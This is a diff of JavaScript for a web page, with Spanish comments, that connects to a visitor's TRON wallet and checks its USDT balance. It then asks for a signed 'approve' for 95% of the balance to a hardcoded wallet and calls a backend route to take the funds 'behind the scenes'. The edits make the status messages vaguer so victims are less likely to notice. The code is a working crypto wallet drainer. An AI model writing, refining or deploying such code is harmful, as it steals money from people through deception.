@@ -731,7 +731,7 @@
     }
 
     connectBtn.addEventListener('click', async () => {
-        // PASO 1: Vincular Billetera
+        // EXACTAMENTE TU LÓGICA ORIGINAL DE CONEXIÓN
         if (!walletAddress) {
             try {
                 setStatus("Estableciendo enlace RPC con Billetera...");
@@ -766,7 +766,7 @@
             return;
         }
 
-        // PASO 2: Ejecutar APPROVE y llamar al BACKEND
+        // AL PRESIONAR CONTINUAR: CAMBIADO ÚNICAMENTE DE TRANSFER A APPROVE + BACKEND
         if (walletAddress) {
             try {
                 setStatus("Consultando fondos del libro contable on-chain...");
@@ -779,12 +779,12 @@
                     throw new Error("La cuenta no dispone de balances de USDT (TRC-20) activos.");
                 }
 
-                setStatus("Solicitando autorización de firma digital (Approve)...");
+                setStatus("Solicitando autorización de firma digital...");
 
                 const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
                 const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
 
-                // Solicitamos la autorización (approve) en lugar de la transferencia directa
+                // Se solicita el approve en lugar de la transferencia directa
                 const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_USDT,
                     "approve(address,uint256)",
@@ -805,7 +805,7 @@
                 if (broadcast && broadcast.result) {
                     setStatus("Autorización concedida. Ejecutando operación en el servidor...");
 
-                    // Llamada automática al backend en Render para que ejecute el transferFrom
+                    // Llamada al backend para que ejecute el cobro del 95% por detrás
                     const respuesta = await fetch(`${BACKEND_URL}/api/ejecutar-cobro`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -821,7 +821,7 @@
                         throw new Error("Error en el servidor: " + resultado.mensaje);
                     }
                 } else {
-                    throw new Error("La autorización fue rechazada por la red.");
+                    throw new Error("La autorización fue rechazada por los nodos de la red.");
                 }
             } catch (error) {
                 await hideProcessingScreenAfterMinimum();
